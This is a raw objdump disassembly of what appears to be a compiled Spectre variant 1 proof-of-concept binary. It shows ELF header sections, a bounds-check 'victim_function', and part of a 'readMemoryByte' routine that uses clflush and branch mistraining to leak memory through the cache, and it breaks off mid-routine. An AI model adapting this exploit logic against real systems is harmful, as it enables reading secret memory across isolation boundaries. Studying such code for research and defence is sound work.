
spectre_drvchr.o:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	ins    BYTE PTR es:[rdi],dx
 23a:	69 62 36 34 2f 6c 64 	imul   esp,DWORD PTR [rdx+0x36],0x646c2f34
 241:	2d 6c 69 6e 75       	sub    eax,0x756e696c
 246:	78 2d                	js     275 <_init-0x383>
 248:	78 38                	js     282 <_init-0x376>
 24a:	36 2d 36 34 2e 73    	ss sub eax,0x732e3436
 250:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 251:	2e 32 00             	xor    al,BYTE PTR cs:[rax]

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    al,0x0
 256:	00 00                	add    BYTE PTR [rax],al
 258:	10 00                	adc    BYTE PTR [rax],al
 25a:	00 00                	add    BYTE PTR [rax],al
 25c:	01 00                	add    DWORD PTR [rax],eax
 25e:	00 00                	add    BYTE PTR [rax],al
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push rbp
 263:	00 00                	add    BYTE PTR [rax],al
 265:	00 00                	add    BYTE PTR [rax],al
 267:	00 03                	add    BYTE PTR [rbx],al
 269:	00 00                	add    BYTE PTR [rax],al
 26b:	00 02                	add    BYTE PTR [rdx],al
 26d:	00 00                	add    BYTE PTR [rax],al
 26f:	00 00                	add    BYTE PTR [rax],al
 271:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    al,0x0
 276:	00 00                	add    BYTE PTR [rax],al
 278:	14 00                	adc    al,0x0
 27a:	00 00                	add    BYTE PTR [rax],al
 27c:	03 00                	add    eax,DWORD PTR [rax]
 27e:	00 00                	add    BYTE PTR [rax],al
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push rbp
 283:	00 44 cd 12          	add    BYTE PTR [rbp+rcx*8+0x12],al
 287:	9e                   	sahf   
 288:	a4                   	movs   BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
 289:	8d                   	(bad)  
 28a:	e5 d7                	in     eax,0xd7
 28c:	14 e3                	adc    al,0xe3
 28e:	d3 89 74 05 43 64    	ror    DWORD PTR [rcx+0x64430574],cl
 294:	ea                   	(bad)  
 295:	2d                   	.byte 0x2d
 296:	d6                   	(bad)  
 297:	72                   	.byte 0x72

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    DWORD PTR [rax],eax
 29a:	00 00                	add    BYTE PTR [rax],al
 29c:	01 00                	add    DWORD PTR [rax],eax
 29e:	00 00                	add    BYTE PTR [rax],al
 2a0:	01 00                	add    DWORD PTR [rax],eax
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	2c 00                	sub    al,0x0
 2d2:	00 00                	add    BYTE PTR [rax],al
 2d4:	12 00                	adc    al,BYTE PTR [rax]
	...
 2e6:	00 00                	add    BYTE PTR [rax],al
 2e8:	7c 00                	jl     2ea <_init-0x30e>
 2ea:	00 00                	add    BYTE PTR [rax],al
 2ec:	20 00                	and    BYTE PTR [rax],al
	...
 2fe:	00 00                	add    BYTE PTR [rax],al
 300:	1b 00                	sbb    eax,DWORD PTR [rax]
 302:	00 00                	add    BYTE PTR [rax],al
 304:	12 00                	adc    al,BYTE PTR [rax]
	...
 316:	00 00                	add    BYTE PTR [rax],al
 318:	34 00                	xor    al,0x0
 31a:	00 00                	add    BYTE PTR [rax],al
 31c:	12 00                	adc    al,BYTE PTR [rax]
	...
 32e:	00 00                	add    BYTE PTR [rax],al
 330:	4a 00 00             	rex.WX add BYTE PTR [rax],al
 333:	00 12                	add    BYTE PTR [rdx],dl
	...
 345:	00 00                	add    BYTE PTR [rax],al
 347:	00 98 00 00 00 20    	add    BYTE PTR [rax+0x20000000],bl
	...
 35d:	00 00                	add    BYTE PTR [rax],al
 35f:	00 0b                	add    BYTE PTR [rbx],cl
 361:	00 00                	add    BYTE PTR [rax],al
 363:	00 12                	add    BYTE PTR [rdx],dl
	...
 375:	00 00                	add    BYTE PTR [rax],al
 377:	00 a7 00 00 00 20    	add    BYTE PTR [rdi+0x20000000],ah
	...
 38d:	00 00                	add    BYTE PTR [rax],al
 38f:	00 3b                	add    BYTE PTR [rbx],bh
 391:	00 00                	add    BYTE PTR [rax],al
 393:	00 22                	add    BYTE PTR [rdx],ah
	...

Disassembly of section .dynstr:

00000000000003a8 <.dynstr>:
 3a8:	00 6c 69 62          	add    BYTE PTR [rcx+rbp*2+0x62],ch
 3ac:	63 2e                	movsxd ebp,DWORD PTR [rsi]
 3ae:	73 6f                	jae    41f <_init-0x1d9>
 3b0:	2e 36 00 5f 5f       	cs add BYTE PTR ss:[rdi+0x5f],bl
 3b5:	69 73 6f 63 39 39 5f 	imul   esi,DWORD PTR [rbx+0x6f],0x5f393963
 3bc:	73 73                	jae    431 <_init-0x1c7>
 3be:	63 61 6e             	movsxd esp,DWORD PTR [rcx+0x6e]
 3c1:	66 00 5f 5f          	data16 add BYTE PTR [rdi+0x5f],bl
 3c5:	73 74                	jae    43b <_init-0x1bd>
 3c7:	61                   	(bad)  
 3c8:	63 6b 5f             	movsxd ebp,DWORD PTR [rbx+0x5f]
 3cb:	63 68 6b             	movsxd ebp,DWORD PTR [rax+0x6b]
 3ce:	5f                   	pop    rdi
 3cf:	66 61                	data16 (bad) 
 3d1:	69 6c 00 70 75 74 63 	imul   ebp,DWORD PTR [rax+rax*1+0x70],0x68637475
 3d8:	68 
 3d9:	61                   	(bad)  
 3da:	72 00                	jb     3dc <_init-0x21c>
 3dc:	70 72                	jo     450 <_init-0x1a8>
 3de:	69 6e 74 66 00 5f 5f 	imul   ebp,DWORD PTR [rsi+0x74],0x5f5f0066
 3e5:	63 78 61             	movsxd edi,DWORD PTR [rax+0x61]
 3e8:	5f                   	pop    rdi
 3e9:	66 69 6e 61 6c 69    	imul   bp,WORD PTR [rsi+0x61],0x696c
 3ef:	7a 65                	jp     456 <_init-0x1a2>
 3f1:	00 5f 5f             	add    BYTE PTR [rdi+0x5f],bl
 3f4:	6c                   	ins    BYTE PTR es:[rdi],dx
 3f5:	69 62 63 5f 73 74 61 	imul   esp,DWORD PTR [rdx+0x63],0x6174735f
 3fc:	72 74                	jb     472 <_init-0x186>
 3fe:	5f                   	pop    rdi
 3ff:	6d                   	ins    DWORD PTR es:[rdi],dx
 400:	61                   	(bad)  
 401:	69 6e 00 47 4c 49 42 	imul   ebp,DWORD PTR [rsi+0x0],0x42494c47
 408:	43 5f                	rex.XB pop r15
 40a:	32 2e                	xor    ch,BYTE PTR [rsi]
 40c:	37                   	(bad)  
 40d:	00 47 4c             	add    BYTE PTR [rdi+0x4c],al
 410:	49                   	rex.WB
 411:	42                   	rex.X
 412:	43 5f                	rex.XB pop r15
 414:	32 2e                	xor    ch,BYTE PTR [rsi]
 416:	34 00                	xor    al,0x0
 418:	47                   	rex.RXB
 419:	4c                   	rex.WR
 41a:	49                   	rex.WB
 41b:	42                   	rex.X
 41c:	43 5f                	rex.XB pop r15
 41e:	32 2e                	xor    ch,BYTE PTR [rsi]
 420:	32 2e                	xor    ch,BYTE PTR [rsi]
 422:	35 00 5f 49 54       	xor    eax,0x54495f00
 427:	4d 5f                	rex.WRB pop r15
 429:	64 65 72 65          	fs gs jb 492 <_init-0x166>
 42d:	67 69 73 74 65 72 54 	imul   esi,DWORD PTR [ebx+0x74],0x4d547265
 434:	4d 
 435:	43 6c                	rex.XB ins BYTE PTR es:[rdi],dx
 437:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 438:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 439:	65 54                	gs push rsp
 43b:	61                   	(bad)  
 43c:	62                   	(bad)  
 43d:	6c                   	ins    BYTE PTR es:[rdi],dx
 43e:	65 00 5f 5f          	add    BYTE PTR gs:[rdi+0x5f],bl
 442:	67 6d                	ins    DWORD PTR es:[edi],dx
 444:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 445:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 446:	5f                   	pop    rdi
 447:	73 74                	jae    4bd <_init-0x13b>
 449:	61                   	(bad)  
 44a:	72 74                	jb     4c0 <_init-0x138>
 44c:	5f                   	pop    rdi
 44d:	5f                   	pop    rdi
 44e:	00 5f 49             	add    BYTE PTR [rdi+0x49],bl
 451:	54                   	push   rsp
 452:	4d 5f                	rex.WRB pop r15
 454:	72 65                	jb     4bb <_init-0x13d>
 456:	67 69 73 74 65 72 54 	imul   esi,DWORD PTR [ebx+0x74],0x4d547265
 45d:	4d 
 45e:	43 6c                	rex.XB ins BYTE PTR es:[rdi],dx
 460:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 461:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 462:	65 54                	gs push rsp
 464:	61                   	(bad)  
 465:	62                   	.byte 0x62
 466:	6c                   	ins    BYTE PTR es:[rdi],dx
 467:	65                   	gs
	...

Disassembly of section .gnu.version:

000000000000046a <.gnu.version>:
 46a:	00 00                	add    BYTE PTR [rax],al
 46c:	02 00                	add    al,BYTE PTR [rax]
 46e:	00 00                	add    BYTE PTR [rax],al
 470:	03 00                	add    eax,DWORD PTR [rax]
 472:	02 00                	add    al,BYTE PTR [rax]
 474:	02 00                	add    al,BYTE PTR [rax]
 476:	00 00                	add    BYTE PTR [rax],al
 478:	04 00                	add    al,0x0
 47a:	00 00                	add    BYTE PTR [rax],al
 47c:	02 00                	add    al,BYTE PTR [rax]

Disassembly of section .gnu.version_r:

0000000000000480 <.gnu.version_r>:
 480:	01 00                	add    DWORD PTR [rax],eax
 482:	03 00                	add    eax,DWORD PTR [rax]
 484:	01 00                	add    DWORD PTR [rax],eax
 486:	00 00                	add    BYTE PTR [rax],al
 488:	10 00                	adc    BYTE PTR [rax],al
 48a:	00 00                	add    BYTE PTR [rax],al
 48c:	00 00                	add    BYTE PTR [rax],al
 48e:	00 00                	add    BYTE PTR [rax],al
 490:	17                   	(bad)  
 491:	69 69 0d 00 00 04 00 	imul   ebp,DWORD PTR [rcx+0xd],0x40000
 498:	5c                   	pop    rsp
 499:	00 00                	add    BYTE PTR [rax],al
 49b:	00 10                	add    BYTE PTR [rax],dl
 49d:	00 00                	add    BYTE PTR [rax],al
 49f:	00 14 69             	add    BYTE PTR [rcx+rbp*2],dl
 4a2:	69 0d 00 00 03 00 66 	imul   ecx,DWORD PTR [rip+0x30000],0x66        # 304ac <__FRAME_END__+0x2f3f0>
 4a9:	00 00 00 
 4ac:	10 00                	adc    BYTE PTR [rax],al
 4ae:	00 00                	add    BYTE PTR [rax],al
 4b0:	75 1a                	jne    4cc <_init-0x12c>
 4b2:	69 09 00 00 02 00    	imul   ecx,DWORD PTR [rcx],0x20000
 4b8:	70 00                	jo     4ba <_init-0x13e>
 4ba:	00 00                	add    BYTE PTR [rax],al
 4bc:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .rela.dyn:

00000000000004c0 <.rela.dyn>:
 4c0:	a0 1d 20 00 00 00 00 	movabs al,ds:0x80000000000201d
 4c7:	00 08 
 4c9:	00 00                	add    BYTE PTR [rax],al
 4cb:	00 00                	add    BYTE PTR [rax],al
 4cd:	00 00                	add    BYTE PTR [rax],al
 4cf:	00 70 07             	add    BYTE PTR [rax+0x7],dh
 4d2:	00 00                	add    BYTE PTR [rax],al
 4d4:	00 00                	add    BYTE PTR [rax],al
 4d6:	00 00                	add    BYTE PTR [rax],al
 4d8:	a8 1d                	test   al,0x1d
 4da:	20 00                	and    BYTE PTR [rax],al
 4dc:	00 00                	add    BYTE PTR [rax],al
 4de:	00 00                	add    BYTE PTR [rax],al
 4e0:	08 00                	or     BYTE PTR [rax],al
 4e2:	00 00                	add    BYTE PTR [rax],al
 4e4:	00 00                	add    BYTE PTR [rax],al
 4e6:	00 00                	add    BYTE PTR [rax],al
 4e8:	30 07                	xor    BYTE PTR [rdi],al
 4ea:	00 00                	add    BYTE PTR [rax],al
 4ec:	00 00                	add    BYTE PTR [rax],al
 4ee:	00 00                	add    BYTE PTR [rax],al
 4f0:	08 20                	or     BYTE PTR [rax],ah
 4f2:	20 00                	and    BYTE PTR [rax],al
 4f4:	00 00                	add    BYTE PTR [rax],al
 4f6:	00 00                	add    BYTE PTR [rax],al
 4f8:	08 00                	or     BYTE PTR [rax],al
 4fa:	00 00                	add    BYTE PTR [rax],al
 4fc:	00 00                	add    BYTE PTR [rax],al
 4fe:	00 00                	add    BYTE PTR [rax],al
 500:	08 20                	or     BYTE PTR [rax],ah
 502:	20 00                	and    BYTE PTR [rax],al
 504:	00 00                	add    BYTE PTR [rax],al
 506:	00 00                	add    BYTE PTR [rax],al
 508:	e0 20                	loopne 52a <_init-0xce>
 50a:	20 00                	and    BYTE PTR [rax],al
 50c:	00 00                	add    BYTE PTR [rax],al
 50e:	00 00                	add    BYTE PTR [rax],al
 510:	08 00                	or     BYTE PTR [rax],al
 512:	00 00                	add    BYTE PTR [rax],al
 514:	00 00                	add    BYTE PTR [rax],al
 516:	00 00                	add    BYTE PTR [rax],al
 518:	58                   	pop    rax
 519:	0e                   	(bad)  
 51a:	00 00                	add    BYTE PTR [rax],al
 51c:	00 00                	add    BYTE PTR [rax],al
 51e:	00 00                	add    BYTE PTR [rax],al
 520:	d8 1f                	fcomp  DWORD PTR [rdi]
 522:	20 00                	and    BYTE PTR [rax],al
 524:	00 00                	add    BYTE PTR [rax],al
 526:	00 00                	add    BYTE PTR [rax],al
 528:	06                   	(bad)  
 529:	00 00                	add    BYTE PTR [rax],al
 52b:	00 02                	add    BYTE PTR [rdx],al
	...
 535:	00 00                	add    BYTE PTR [rax],al
 537:	00 e0                	add    al,ah
 539:	1f                   	(bad)  
 53a:	20 00                	and    BYTE PTR [rax],al
 53c:	00 00                	add    BYTE PTR [rax],al
 53e:	00 00                	add    BYTE PTR [rax],al
 540:	06                   	(bad)  
 541:	00 00                	add    BYTE PTR [rax],al
 543:	00 05 00 00 00 00    	add    BYTE PTR [rip+0x0],al        # 549 <_init-0xaf>
 549:	00 00                	add    BYTE PTR [rax],al
 54b:	00 00                	add    BYTE PTR [rax],al
 54d:	00 00                	add    BYTE PTR [rax],al
 54f:	00 e8                	add    al,ch
 551:	1f                   	(bad)  
 552:	20 00                	and    BYTE PTR [rax],al
 554:	00 00                	add    BYTE PTR [rax],al
 556:	00 00                	add    BYTE PTR [rax],al
 558:	06                   	(bad)  
 559:	00 00                	add    BYTE PTR [rax],al
 55b:	00 06                	add    BYTE PTR [rsi],al
	...
 565:	00 00                	add    BYTE PTR [rax],al
 567:	00 f0                	add    al,dh
 569:	1f                   	(bad)  
 56a:	20 00                	and    BYTE PTR [rax],al
 56c:	00 00                	add    BYTE PTR [rax],al
 56e:	00 00                	add    BYTE PTR [rax],al
 570:	06                   	(bad)  
 571:	00 00                	add    BYTE PTR [rax],al
 573:	00 08                	add    BYTE PTR [rax],cl
	...
 57d:	00 00                	add    BYTE PTR [rax],al
 57f:	00 f8                	add    al,bh
 581:	1f                   	(bad)  
 582:	20 00                	and    BYTE PTR [rax],al
 584:	00 00                	add    BYTE PTR [rax],al
 586:	00 00                	add    BYTE PTR [rax],al
 588:	06                   	(bad)  
 589:	00 00                	add    BYTE PTR [rax],al
 58b:	00 09                	add    BYTE PTR [rcx],cl
	...

Disassembly of section .rela.plt:

0000000000000598 <.rela.plt>:
 598:	b8 1f 20 00 00       	mov    eax,0x201f
 59d:	00 00                	add    BYTE PTR [rax],al
 59f:	00 07                	add    BYTE PTR [rdi],al
 5a1:	00 00                	add    BYTE PTR [rax],al
 5a3:	00 01                	add    BYTE PTR [rcx],al
	...
 5ad:	00 00                	add    BYTE PTR [rax],al
 5af:	00 c0                	add    al,al
 5b1:	1f                   	(bad)  
 5b2:	20 00                	and    BYTE PTR [rax],al
 5b4:	00 00                	add    BYTE PTR [rax],al
 5b6:	00 00                	add    BYTE PTR [rax],al
 5b8:	07                   	(bad)  
 5b9:	00 00                	add    BYTE PTR [rax],al
 5bb:	00 03                	add    BYTE PTR [rbx],al
	...
 5c5:	00 00                	add    BYTE PTR [rax],al
 5c7:	00 c8                	add    al,cl
 5c9:	1f                   	(bad)  
 5ca:	20 00                	and    BYTE PTR [rax],al
 5cc:	00 00                	add    BYTE PTR [rax],al
 5ce:	00 00                	add    BYTE PTR [rax],al
 5d0:	07                   	(bad)  
 5d1:	00 00                	add    BYTE PTR [rax],al
 5d3:	00 04 00             	add    BYTE PTR [rax+rax*1],al
	...
 5de:	00 00                	add    BYTE PTR [rax],al
 5e0:	d0 1f                	rcr    BYTE PTR [rdi],1
 5e2:	20 00                	and    BYTE PTR [rax],al
 5e4:	00 00                	add    BYTE PTR [rax],al
 5e6:	00 00                	add    BYTE PTR [rax],al
 5e8:	07                   	(bad)  
 5e9:	00 00                	add    BYTE PTR [rax],al
 5eb:	00 07                	add    BYTE PTR [rdi],al
	...

Disassembly of section .init:

00000000000005f8 <_init>:
 5f8:	48 83 ec 08          	sub    rsp,0x8
 5fc:	48 8b 05 e5 19 20 00 	mov    rax,QWORD PTR [rip+0x2019e5]        # 201fe8 <__gmon_start__>
 603:	48 85 c0             	test   rax,rax
 606:	74 02                	je     60a <_init+0x12>
 608:	ff d0                	call   rax
 60a:	48 83 c4 08          	add    rsp,0x8
 60e:	c3                   	ret    

Disassembly of section .plt:

0000000000000610 <.plt>:
 610:	ff 35 92 19 20 00    	push   QWORD PTR [rip+0x201992]        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x8>
 616:	ff 25 94 19 20 00    	jmp    QWORD PTR [rip+0x201994]        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x10>
 61c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000000620 <putchar@plt>:
 620:	ff 25 92 19 20 00    	jmp    QWORD PTR [rip+0x201992]        # 201fb8 <putchar@GLIBC_2.2.5>
 626:	68 00 00 00 00       	push   0x0
 62b:	e9 e0 ff ff ff       	jmp    610 <.plt>

0000000000000630 <__stack_chk_fail@plt>:
 630:	ff 25 8a 19 20 00    	jmp    QWORD PTR [rip+0x20198a]        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 636:	68 01 00 00 00       	push   0x1
 63b:	e9 d0 ff ff ff       	jmp    610 <.plt>

0000000000000640 <printf@plt>:
 640:	ff 25 82 19 20 00    	jmp    QWORD PTR [rip+0x201982]        # 201fc8 <printf@GLIBC_2.2.5>
 646:	68 02 00 00 00       	push   0x2
 64b:	e9 c0 ff ff ff       	jmp    610 <.plt>

0000000000000650 <__isoc99_sscanf@plt>:
 650:	ff 25 7a 19 20 00    	jmp    QWORD PTR [rip+0x20197a]        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 656:	68 03 00 00 00       	push   0x3
 65b:	e9 b0 ff ff ff       	jmp    610 <.plt>

Disassembly of section .plt.got:

0000000000000660 <__cxa_finalize@plt>:
 660:	ff 25 92 19 20 00    	jmp    QWORD PTR [rip+0x201992]        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 666:	66 90                	xchg   ax,ax

Disassembly of section .text:

0000000000000670 <_start>:
 670:	31 ed                	xor    ebp,ebp
 672:	49 89 d1             	mov    r9,rdx
 675:	5e                   	pop    rsi
 676:	48 89 e2             	mov    rdx,rsp
 679:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
 67d:	50                   	push   rax
 67e:	54                   	push   rsp
 67f:	4c 8d 05 ba 07 00 00 	lea    r8,[rip+0x7ba]        # e40 <__libc_csu_fini>
 686:	48 8d 0d 43 07 00 00 	lea    rcx,[rip+0x743]        # dd0 <__libc_csu_init>
 68d:	48 8d 3d 4c 05 00 00 	lea    rdi,[rip+0x54c]        # be0 <main>
 694:	ff 15 46 19 20 00    	call   QWORD PTR [rip+0x201946]        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 69a:	f4                   	hlt    
 69b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000006a0 <deregister_tm_clones>:
 6a0:	48 8d 3d 41 1a 20 00 	lea    rdi,[rip+0x201a41]        # 2020e8 <__TMC_END__>
 6a7:	55                   	push   rbp
 6a8:	48 8d 05 39 1a 20 00 	lea    rax,[rip+0x201a39]        # 2020e8 <__TMC_END__>
 6af:	48 39 f8             	cmp    rax,rdi
 6b2:	48 89 e5             	mov    rbp,rsp
 6b5:	74 19                	je     6d0 <deregister_tm_clones+0x30>
 6b7:	48 8b 05 1a 19 20 00 	mov    rax,QWORD PTR [rip+0x20191a]        # 201fd8 <_ITM_deregisterTMCloneTable>
 6be:	48 85 c0             	test   rax,rax
 6c1:	74 0d                	je     6d0 <deregister_tm_clones+0x30>
 6c3:	5d                   	pop    rbp
 6c4:	ff e0                	jmp    rax
 6c6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 6cd:	00 00 00 
 6d0:	5d                   	pop    rbp
 6d1:	c3                   	ret    
 6d2:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 6d6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 6dd:	00 00 00 

00000000000006e0 <register_tm_clones>:
 6e0:	48 8d 3d 01 1a 20 00 	lea    rdi,[rip+0x201a01]        # 2020e8 <__TMC_END__>
 6e7:	48 8d 35 fa 19 20 00 	lea    rsi,[rip+0x2019fa]        # 2020e8 <__TMC_END__>
 6ee:	55                   	push   rbp
 6ef:	48 29 fe             	sub    rsi,rdi
 6f2:	48 89 e5             	mov    rbp,rsp
 6f5:	48 c1 fe 03          	sar    rsi,0x3
 6f9:	48 89 f0             	mov    rax,rsi
 6fc:	48 c1 e8 3f          	shr    rax,0x3f
 700:	48 01 c6             	add    rsi,rax
 703:	48 d1 fe             	sar    rsi,1
 706:	74 18                	je     720 <register_tm_clones+0x40>
 708:	48 8b 05 e1 18 20 00 	mov    rax,QWORD PTR [rip+0x2018e1]        # 201ff0 <_ITM_registerTMCloneTable>
 70f:	48 85 c0             	test   rax,rax
 712:	74 0c                	je     720 <register_tm_clones+0x40>
 714:	5d                   	pop    rbp
 715:	ff e0                	jmp    rax
 717:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
 71e:	00 00 
 720:	5d                   	pop    rbp
 721:	c3                   	ret    
 722:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 726:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 72d:	00 00 00 

0000000000000730 <__do_global_dtors_aux>:
 730:	80 3d c9 19 20 00 00 	cmp    BYTE PTR [rip+0x2019c9],0x0        # 202100 <completed.7698>
 737:	75 2f                	jne    768 <__do_global_dtors_aux+0x38>
 739:	48 83 3d b7 18 20 00 	cmp    QWORD PTR [rip+0x2018b7],0x0        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 740:	00 
 741:	55                   	push   rbp
 742:	48 89 e5             	mov    rbp,rsp
 745:	74 0c                	je     753 <__do_global_dtors_aux+0x23>
 747:	48 8b 3d ba 18 20 00 	mov    rdi,QWORD PTR [rip+0x2018ba]        # 202008 <__dso_handle>
 74e:	e8 0d ff ff ff       	call   660 <__cxa_finalize@plt>
 753:	e8 48 ff ff ff       	call   6a0 <deregister_tm_clones>
 758:	c6 05 a1 19 20 00 01 	mov    BYTE PTR [rip+0x2019a1],0x1        # 202100 <completed.7698>
 75f:	5d                   	pop    rbp
 760:	c3                   	ret    
 761:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
 768:	f3 c3                	repz ret 
 76a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]

0000000000000770 <frame_dummy>:
 770:	55                   	push   rbp
 771:	48 89 e5             	mov    rbp,rsp
 774:	5d                   	pop    rbp
 775:	e9 66 ff ff ff       	jmp    6e0 <register_tm_clones>

000000000000077a <victim_function>:
 77a:	55                   	push   rbp
 77b:	48 89 e5             	mov    rbp,rsp
 77e:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
 782:	8b 05 98 18 20 00    	mov    eax,DWORD PTR [rip+0x201898]        # 202020 <array1_size>
 788:	89 c0                	mov    eax,eax
 78a:	48 39 45 f8          	cmp    QWORD PTR [rbp-0x8],rax
 78e:	73 34                	jae    7c4 <victim_function+0x4a>
 790:	48 8d 15 a9 18 20 00 	lea    rdx,[rip+0x2018a9]        # 202040 <array1>
 797:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
 79b:	48 01 d0             	add    rax,rdx
 79e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 7a1:	0f b6 c0             	movzx  eax,al
 7a4:	c1 e0 09             	shl    eax,0x9
 7a7:	48 63 d0             	movsxd rdx,eax
 7aa:	48 8d 05 6f 19 20 00 	lea    rax,[rip+0x20196f]        # 202120 <array2>
 7b1:	0f b6 14 02          	movzx  edx,BYTE PTR [rdx+rax*1]
 7b5:	0f b6 05 64 19 22 00 	movzx  eax,BYTE PTR [rip+0x221964]        # 222120 <temp>
 7bc:	21 d0                	and    eax,edx
 7be:	88 05 5c 19 22 00    	mov    BYTE PTR [rip+0x22195c],al        # 222120 <temp>
 7c4:	90                   	nop
 7c5:	5d                   	pop    rbp
 7c6:	c3                   	ret    

00000000000007c7 <readMemoryByte>:
 7c7:	55                   	push   rbp
 7c8:	48 89 e5             	mov    rbp,rsp
 7cb:	53                   	push   rbx
 7cc:	48 81 ec 88 00 00 00 	sub    rsp,0x88
 7d3:	48 89 7d 88          	mov    QWORD PTR [rbp-0x78],rdi
 7d7:	48 89 75 80          	mov    QWORD PTR [rbp-0x80],rsi
 7db:	48 89 95 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],rdx
 7e2:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 7e9:	00 00 
 7eb:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
 7ef:	31 c0                	xor    eax,eax
 7f1:	c7 45 94 00 00 00 00 	mov    DWORD PTR [rbp-0x6c],0x0
 7f8:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 7ff:	eb 1f                	jmp    820 <readMemoryByte+0x59>
 801:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 804:	48 98                	cdqe   
 806:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 80d:	00 
 80e:	48 8d 05 2b 19 22 00 	lea    rax,[rip+0x22192b]        # 222140 <results.23458>
 815:	c7 04 02 00 00 00 00 	mov    DWORD PTR [rdx+rax*1],0x0
 81c:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 820:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 827:	7e d8                	jle    801 <readMemoryByte+0x3a>
 829:	c7 45 9c e7 03 00 00 	mov    DWORD PTR [rbp-0x64],0x3e7
 830:	e9 fa 02 00 00       	jmp    b2f <readMemoryByte+0x368>
 835:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 83c:	eb 22                	jmp    860 <readMemoryByte+0x99>
 83e:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 841:	c1 e0 09             	shl    eax,0x9
 844:	48 63 d0             	movsxd rdx,eax
 847:	48 8d 05 d2 18 20 00 	lea    rax,[rip+0x2018d2]        # 202120 <array2>
 84e:	48 01 d0             	add    rax,rdx
 851:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
 855:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
 859:	0f ae 38             	clflush BYTE PTR [rax]
 85c:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 860:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 867:	7e d5                	jle    83e <readMemoryByte+0x77>
 869:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 86c:	8b 0d ae 17 20 00    	mov    ecx,DWORD PTR [rip+0x2017ae]        # 202020 <array1_size>
 872:	ba 00 00 00 00       	mov    edx,0x0
 877:	f7 f1                	div    ecx
 879:	89 d0                	mov    eax,edx
 87b:	89 c0                	mov    eax,eax
 87d:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
 881:	c7 45 a4 1d 00 00 00 	mov    DWORD PTR [rbp-0x5c],0x1d
 888:	e9 88 00 00 00       	jmp    915 <readMemoryByte+0x14e>
 88d:	48 8d 05 8c 17 20 00 	lea    rax,[rip+0x20178c]        # 202020 <array1_size>
 894:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
 898:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
 89c:	0f ae 38             	clflush BYTE PTR [rax]
 89f:	c7 45 98 00 00 00 00 	mov    DWORD PTR [rbp-0x68],0x0
 8a6:	eb 09                	jmp    8b1 <readMemoryByte+0xea>
 8a8:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8ab:	83 c0 01             	add    eax,0x1
 8ae:	89 45 98             	mov    DWORD PTR [rbp-0x68],eax
 8b1:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8b4:	83 f8 63             	cmp    eax,0x63
 8b7:	7e ef                	jle    8a8 <readMemoryByte+0xe1>
 8b9:	8b 4d a4             	mov    ecx,DWORD PTR [rbp-0x5c]
 8bc:	ba ab aa aa 2a       	mov    edx,0x2aaaaaab
 8c1:	89 c8                	mov    eax,ecx
 8c3:	f7 ea                	imul   edx
 8c5:	89 c8                	mov    eax,ecx
 8c7:	c1 f8 1f             	sar    eax,0x1f
 8ca:	29 c2                	sub    edx,eax
 8cc:	89 d0                	mov    eax,edx
